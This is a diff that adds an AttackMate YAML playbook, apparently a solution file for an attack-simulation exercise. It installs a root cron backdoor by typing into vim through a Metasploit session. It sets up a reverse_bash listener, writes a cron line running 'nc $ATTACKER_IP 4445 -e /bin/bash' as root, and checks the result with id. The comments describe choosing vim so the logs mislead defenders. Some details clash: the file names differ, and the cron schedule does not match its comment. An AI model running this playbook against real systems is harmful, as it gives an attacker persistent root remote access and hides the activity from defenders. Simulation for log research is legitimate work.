@@ -1,0 +1,111 @@
+# Phase 5b SOLUTION: Persistence - Cron Backdoor (via interactive vim session)
+#
+# Alternative to solution_persist_cron.yml. Edits /etc/cron.d/backdoor by
+# driving vim interactively through the msf-session, like as a human
+# operator would at a keyboard.
+#
+# Why this matters for realistic log generation:
+#   A plain `echo '...' > /etc/cron.d/backdoor` leaves a very scripted-looking
+#   line in shell history and audit logs. A vim session produces a sequence of
+#   interactive keystrokes with typical editing pauses. To a defender reading
+#   logs, the vim approach looks far more like a real operator than a script.
+#   This is one of AttackMate's key strengths: generating realistic looking logs.
+#
+# vim interaction flow:
+#   1. Open vim (the file is created on first save)
+#   2. Remap jj -> ESC so we can exit insert mode cleanly from YAML
+#   3. Enter insert mode (i)
+#   4. Type the cron payload line
+#   5. Exit insert mode (jj)
+#   6. Save and quit (:wq!\n)
+#
+# Key principle: every vim ex command (:wq!, :inoremap, etc.) is only executed
+# when Enter is pressed. In a normal terminal session, pressing Enter sends \n.
+# When driving vim through msf-session you must include \n explicitly at the end
+# of any command you want executed. Omitting it leaves the text in the vim
+# command line, the session appears to hang, and the file is never saved.
+#
+# Variables required: $SESSION_NAME, $ATTACKER_IP, $LPORT
+# ATT&CK: T1053.003 (Scheduled Task/Job: Cron)
+#
+# LPORT: use 4445 (4444 is already in use by the entry session).
+# CLEANUP: Remove /etc/cron.d/backdoor after the exercise.
+
+commands:
+
+  # Start a listener to catch the cron callback.
+  # background: true keeps AttackMate running while it waits for the callback.
+  - type: msf-module
+    cmd: exploit/multi/handler
+    creates_session: cron_callback
+    payload: cmd/unix/reverse_bash
+    payload_options:
+      LHOST: $ATTACKER_IP
+      LPORT: "4445"
+    background: true
+    kill_on_exit: true
+    metadata:
+      tactic: "TA0011"
+      technique: "T1095"
+      technique_name: "Non-Application Layer Protocol"
+
+  # Open vim on the target cron file.
+  # The file does not exist yet - vim will create it on save.
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: "vim /etc/cron.d/backdoor7"
+
+  - type: sleep
+    seconds: 5   # wait for vim to fully load
+
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: ":inoremap jj <ESC>"
+
+  - type: sleep
+    seconds: 2   # wait for vim to fully load
+
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: "o"
+
+  # Type the cron payload line.
+  # nc -e spawns /bin/bash and connects it to the attacker listener.
+  # The wildcard fields (minute/hour/day/month/weekday) set it to fire every minute
+  # (not a realistic backdoor, but it ensures the callback will arrive within 60 seconds of saving)
+
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: "1 * * * * root nc $ATTACKER_IP 4445 -e /bin/bash"
+    metadata:
+      tactic: "TA0003"
+      technique: "T1053.003"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: "jj"   # send raw ESC byte to exit insert mode
+
+  # Save the file and quit vim.
+  # \n is mandatory here: ":wq!" typed without Enter just sits in the vim
+  # command line and the session hangs indefinitely.
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: ":wq!\n"
+    metadata:
+      tactic: "TA0003"
+      technique: "T1053.003"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: debug
+    cmd: "Cron file written via vim. Listener running - waiting for callback"
+
+  # Confirm the callback arrived and we have root.
+  - type: msf-session
+    session: cron_callback
+    cmd: id
+
+  # CLEANUP: uncomment to remove the backdoor cron entry
+  # - type: msf-session
+  #   session: $SESSION_NAME
+  #   cmd: "rm /etc/cron.d/backdoor"
